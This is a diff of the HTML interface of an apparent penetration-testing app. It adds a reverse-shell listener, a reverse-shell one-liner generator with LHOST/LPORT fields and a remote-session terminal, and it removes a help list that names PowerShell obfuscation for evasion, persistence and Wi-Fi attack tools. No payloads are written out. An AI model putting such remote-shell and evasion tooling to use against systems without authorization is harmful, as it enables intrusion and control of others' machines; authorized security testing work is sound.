+                        <button class="tab" data-tab="dbs">Databases</button>
+                        <button class="tab" data-tab="llm">LLM</button>
+                        <button class="tab" data-tab="quick">Quick Tools</button>
+                        <button class="tab" data-tab="guides">Guides</button>
+                    </div>
+
+                    <div class="tab-panel active" id="lib-findings">
+                        <div class="card">
+                            <h3>Merge findings</h3>
+                            <div class="form-grid">
+                                <div class="form-group">
+                                    <label for="find-dest">Destination log</label>
+                                    <input type="text" id="find-dest" placeholder="/path/to/destination.jsonl">
+                                </div>
+                                <div class="form-group">
+                                    <label for="find-src">Source log</label>
+                                    <input type="text" id="find-src" placeholder="/path/to/source.jsonl">
+                                </div>
+                            </div>
+                            <div class="action-bar"><button class="btn primary" id="btn-find-record">Record findings</button></div>
+                        </div>
+                        <div class="card">
+                            <h3>View findings log</h3>
+                            <div class="input-with-button">
+                                <input type="text" id="find-log-path" placeholder="/path/to/findings.jsonl">
+                                <button class="btn secondary" id="btn-find-browse">Browse</button>
+                            </div>
+                            <div class="action-bar"><button class="btn primary" id="btn-find-view">View findings</button></div>
+                        </div>
+                        <div class="card">
+                            <h3>Schedule retest</h3>
+                            <div class="input-with-button">
+                                <input type="text" id="find-retest-path" placeholder="/path/to/findings.jsonl">
+                                <button class="btn secondary" id="btn-find-retest-browse">Browse</button>
+                            </div>
+                            <div class="action-bar"><button class="btn primary" id="btn-find-retest">Schedule retest</button></div>
+                        </div>
+                        <div class="output-block" id="output-findings"><div class="empty-state">Findings tools will print here.</div></div>
+                    </div>
+
+                    <div class="tab-panel" id="lib-audit">
+                        <div class="card">
+                            <h3>Audit log</h3>
+                            <div class="input-with-button">
+                                <input type="text" id="audit-path" placeholder="/path/to/audit.jsonl">
+                                <button class="btn secondary" id="btn-audit-browse">Browse</button>
+                            </div>
+                            <div class="action-bar"><button class="btn primary" id="btn-audit-view">View audit log</button></div>
+                        </div>
+                        <div class="output-block" id="output-audit"><div class="empty-state">Audit records will print here.</div></div>
+                    </div>
+
+                    <div class="tab-panel" id="lib-dbs">
+                        <div class="db-grid">
+                            <div class="card">
+                                <h3>Audit DB</h3>
+                                <input type="text" id="db-audit-path" placeholder="/path/to/audit.sadb">
+                                <button class="btn primary" id="btn-db-audit">View</button>
+                            </div>
+                            <div class="card">
+                                <h3>Findings DB</h3>
+                                <input type="text" id="db-findings-path" placeholder="/path/to/findings.sadb">
+                                <button class="btn primary" id="btn-db-findings">View</button>
+                            </div>
+                            <div class="card">
+                                <h3>Calibration DB</h3>
+                                <input type="text" id="db-cal-path" placeholder="/path/to/calibration.sadb">
+                                <button class="btn primary" id="btn-db-cal">View</button>
+                            </div>
+                            <div class="card">
+                                <h3>Reasoning log DB</h3>
+                                <input type="text" id="db-reason-path" placeholder="/path/to/reasoning.sadb">
+                                <button class="btn primary" id="btn-db-reason">View</button>
+                            </div>
+                        </div>
+                        <div class="output-block" id="output-dbs"><div class="empty-state">Database views will print here.</div></div>
+                    </div>
+
+                    <div class="tab-panel" id="lib-llm">
+                        <div class="card">
+                            <h3>Generate text</h3>
+                            <textarea id="llm-prompt" rows="4" placeholder="Write a security report summary for a web app assessment…"></textarea>
+                            <div class="action-bar"><button class="btn primary" id="btn-llm-gen">Generate</button></div>
+                        </div>
+                        <div class="card">
+                            <h3>Anomaly score</h3>
+                            <textarea id="llm-text" rows="4" placeholder="Paste log text to score for anomalies…"></textarea>
+                            <div class="action-bar"><button class="btn primary" id="btn-llm-anom">Score</button></div>
+                        </div>
+                        <div class="output-block" id="output-llm"><div class="empty-state">LLM output will appear here.</div></div>
+                    </div>
+
+                    <div class="tab-panel" id="lib-quick">
+                        <div class="search-input">
+                            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
+                            <input type="text" id="quick-search" placeholder="Search quick tools… (hash, wifi, shell, wordlist)">
+                        </div>
+                        <div class="quick-grid" id="quick-grid"></div>
+                        <div class="card" id="quick-form" style="display:none;"></div>
+                        <div class="output-block" id="output-quick"><div class="empty-state">Pick a quick tool to run a single-purpose command.</div></div>
+                    </div>
+
+                    <div class="tab-panel" id="lib-guides">
+                        <div class="card">
+                            <h3>Plain-language guide</h3>
+                            <div class="input-with-button">
+                                <input type="text" id="guide-section" placeholder="Section (optional)">
+                                <button class="btn primary" id="btn-guide">Show guide</button>
+                            </div>
+                            <div class="action-bar"><button class="btn secondary" id="btn-shell-guide">Shell payload guide</button></div>
+                        </div>
+                        <div class="card">
+                            <h3>Help for a specific command or tool</h3>
+                            <div class="input-with-button">
+                                <input type="text" id="tool-help-input" placeholder="Command or tool name">
+                                <button class="btn primary" id="btn-tool-help">Show help</button>
+                            </div>
+                        </div>
+                        <div class="output-block" id="output-guides"><div class="empty-state">Guides will print here.</div></div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- ═══ VIEW: SERVER (listener + payloads) ═══ -->
+            <section class="view" id="view-server">
+                <div class="view-inner">
+                    <div class="card">
+                        <h3>Live listener</h3>
+                        <p class="card-hint">Starts the built-in <code>--listen</code> reverse-shell listener. Requires <strong>Online</strong> mode; the Offline/Online toggle in the sidebar is enforced in the main process, not just the UI.</p>
+                        <div class="form-grid">
+                            <div class="form-group">
+                                <label for="srv-port">Port</label>
+                                <input type="number" id="srv-port" value="4444" min="1" max="65535" inputmode="numeric">
+                            </div>
+                            <div class="form-group">
+                                <label for="srv-max">Max connections <span class="muted">(blank = unlimited)</span></label>
+                                <input type="number" id="srv-max" placeholder="unlimited" min="1">
+                            </div>
+                            <div class="form-group">
+                                <label for="srv-bind">Bind address</label>
+                                <input type="text" id="srv-bind" value="0.0.0.0" placeholder="0.0.0.0">
+                            </div>
+                        </div>
+                        <div class="form-group checkbox">
+                            <label><input type="checkbox" id="srv-log"> Record sessions to <code>runs/listener-sessions.jsonl</code> (<code>--log</code>)</label>
+                        </div>
+                        <div class="action-bar">
+                            <button class="btn primary" id="srv-start">Start listener</button>
+                            <button class="btn danger" id="srv-stop" disabled>Stop listener</button>
+                        </div>
+                        <div id="srv-listen-status" class="srv-status stopped">
+                            <span class="srv-status-dot"></span><span id="srv-listen-status-text">Stopped</span>
                         </div>
                     </div>
 
-                    <div class="help-section">
-                        <h2>🔍 Engagement</h2>
-                        <div class="help-card">
-                            <h3>Plan Scan</h3>
-                            <p>Describe a target and let the agent plan a comprehensive security scan automatically.</p>
-                            <ol>
-                                <li>Enter a target description (e.g., "web app at 192.168.1.1").</li>
-                                <li>Set the scope and rules of engagement.</li>
-                                <li>Click <strong>Generate Plan</strong> — the agent builds a step-by-step scan plan.</li>
-                            </ol>
+                    <div class="card">
+                        <h3>Reverse-shell payload</h3>
+                        <p class="card-hint">Generate a one-liner with <code>--gen-shell</code> for the shell type on the target. Run it on the target, and the session appears in the terminal below.</p>
+                        <div class="form-grid">
+                            <div class="form-group">
+                                <label for="srv-type">Shell type</label>
+                                <select id="srv-type"></select>
+                            </div>
+                            <div class="form-group">
+                                <label for="srv-lhost">LHOST</label>
+                                <input type="text" id="srv-lhost" value="127.0.0.1" placeholder="your IP / hostname">
+                            </div>
+                            <div class="form-group">
+                                <label for="srv-lport">LPORT</label>
+                                <input type="number" id="srv-lport" value="4444" min="1" max="65535" inputmode="numeric">
+                            </div>
                         </div>
-                        <div class="help-card">
-                            <h3>Findings</h3>
-                            <p>View and manage security findings discovered during scans. Each finding includes severity, description, and remediation steps.</p>
+                        <div class="action-bar">
+                            <button class="btn primary" id="srv-gen">Generate</button>
+                            <button class="btn secondary" id="srv-copy" disabled>Copy payload</button>
                         </div>
-                        <div class="help-card">
-                            <h3>Schedule Retest</h3>
-                            <p>Set up recurring retests to verify that fixes have been applied. Enter a finding ID and a schedule.</p>
-                        </div>
+                        <pre id="srv-payload" class="srv-payload">Payload output will appear here.</pre>
                     </div>
 
-                    <div class="help-section">
-                        <h2>💾 Data & Databases</h2>
-                        <div class="help-card">
-                            <ul>
-                                <li><strong>Audit Log</strong> — Timestamped record of every action performed in the app.</li>
-                                <li><strong>Audit Database</strong> — Query the structured audit database with SQL-like filters.</li>
-                                <li><strong>Findings Database</strong> — Browse and search all security findings.</li>
-                                <li><strong>Calibration DB</strong> — Configuration data for tool calibration and tuning.</li>
-                                <li><strong>Reasoning Log</strong> — View the agent's decision-making process and logic chain.</li>
-                            </ul>
+                    <div class="card">
+                        <div class="term-head">
+                            <h3>Session terminal</h3>
+                            <span id="srv-session-pill" class="srv-session-pill idle">no session</span>
+                        </div>
+                        <div id="srv-term-out" class="term-out" tabindex="0"><span class="term-placeholder">Start the listener, then run a generated payload — the session opens here automatically.</span></div>
+                        <div class="term-toolbar">
+                            <button class="btn small" id="srv-term-interrupt" title="Send Ctrl-C (0x03) to the remote shell — best-effort on line relays">Ctrl-C</button>
+                            <button class="btn small danger" id="srv-term-exit" title="Send 'exit' on the listener stdin to close the current session (listener keeps running)">exit</button>
+                            <span class="spacer"></span>
+                            <button class="btn small" id="srv-term-clear">Clear</button>
+                        </div>
+                        <div class="term-input-row">
+                            <span class="term-prompt">$</span>
+                            <input type="text" id="srv-term-input" placeholder="Type a command for the connected shell… (Enter sends)" autocomplete="off" spellcheck="false">
+                            <button class="btn primary" id="srv-term-send">Send</button>
                         </div>
                     </div>
-
-                    <div class="help-section">
-                        <h2>🧠 Intelligence</h2>
-                        <div class="help-card">
-                            <ul>
-                                <li><strong>Generate Text</strong> — Use the built-in LLM to generate security reports, policies, or analysis text.</li>
-                                <li><strong>Anomaly Score</strong> — Score a log entry or network event for anomalous behavior.</li>
-                                <li><strong>Ask (NLU)</strong> — Ask questions in plain English and get answers from the agent's knowledge base.</li>
-                            </ul>
-                        </div>
-                    </div>
-
-                    <div class="help-section">
-                        <h2>⚔️ Offensive Tools</h2>
-                        <div class="help-card">
-                            <ul>
-                                <li><strong>Hash ID</strong> — Identify hash types (MD5, SHA1, bcrypt, etc.).</li>
-                                <li><strong>Password Strength</strong> — Test password complexity and get a strength score.</li>
-                                <li><strong>Gen Wordlist</strong> — Generate custom wordlists for password testing.</li>
-                                <li><strong>Gen Shell Payload</strong> — Create reverse shell payloads for authorized penetration testing.</li>
-                                <li><strong>Analyze Payload</strong> — Inspect and analyze suspicious payloads.</li>
-                                <li><strong>PS Obfuscation</strong> — Obfuscate PowerShell scripts for evasion testing.</li>
-                                <li><strong>Wireless Audit</strong> — Audit Wi-Fi networks for vulnerabilities.</li>
-                                <li><strong>Post-Exploit</strong> — Post-exploitation enumeration and persistence tools.</li>
-                                <li><strong>Gen Decoys</strong> — Generate decoy files and honeytokens.</li>
-                                <li><strong>Analyze Handshake</strong> — Analyze captured WPA/WPA2 handshakes.</li>
-                                <li><strong>WPS PIN</strong> — Generate and test WPS PINs.</li>
-                                <li><strong>Analyze Keys</strong> — Analyze cryptographic keys for weaknesses.</li>
-                            </ul>
-                        </div>
-                    </div>
-
-                    <div class="help-section">
-                        <h2>⌨️ Keyboard Shortcuts</h2>
-                        <div class="help-card">
-                            <ul>
-                                <li><strong>Ctrl+1 through Ctrl+9</strong> — Quick-switch between sidebar panels.</li>
-                                <li><strong>Ctrl+Shift+S</strong> — Refresh system status.</li>
-                                <li><strong>Ctrl+L</strong> — Clear current output.</li>
-                                <li><strong>Escape</strong> — Return to Dashboard.</li>
-                            </ul>
-                        </div>
-                    </div>
-
-                    <div class="help-section">
-                        <h2>❓ Troubleshooting</h2>
-                        <div class="help-card">
-                            <h3>Binary Not Found</h3>
-                            <p>If you see a "binary not found" warning, run <code>make build</code> from the project root to compile the security-agent binary.</p>
-                        </div>
-                        <div class="help-card">
-                            <h3>Tool Not Installed</h3>
-                            <p>If a tool shows as "not found" in List Tools, install it via your system's package manager (e.g., <code>apt install nmap</code>).</p>
-                        </div>
-                        <div class="help-card">
-                            <h3>Offline Mode</h3>
-                            <p>In Offline mode, all operations run locally without network access. Switch to Online mode if you need to download tool databases or reach remote targets.</p>
-                        </div>
-                    </div>
-
                 </div>
             </section>
         </main>
     </div>
 
-    <!-- Verbose Log Console -->
+    <!-- ═══ Run status bar ═══ -->
+    <div id="run-statusbar" class="run-statusbar">
+        <span id="run-indicator" class="run-indicator idle"></span>
+        <span id="run-label" class="run-label">Idle</span>
+        <button class="btn danger small" id="btn-run-cancel" style="display:none;">Cancel</button>
+        <span class="spacer"></span>
+        <span id="run-mode-chip" class="run-mode-chip">offline</span>
+        <button id="log-toggle" class="log-toggle" title="Toggle verbose log console">&#9776; Logs <span id="log-badge" class="log-badge">0</span></button>
+    </div>
+
+    <!-- ═══ Log console ═══ -->
     <div id="log-console" class="log-console collapsed" aria-label="Verbose log console">
         <div class="log-header">
-            <button id="log-toggle" class="log-toggle" title="Toggle verbose log console">
-                <span class="log-caret">&#9656;</span> Verbose Logs
-            </button>
-            <span id="log-badge" class="log-badge">0</span>
             <span class="log-hint">main + renderer activity</span>
             <button id="log-clear" class="log-clear" title="Clear logs">Clear</button>
         </div>
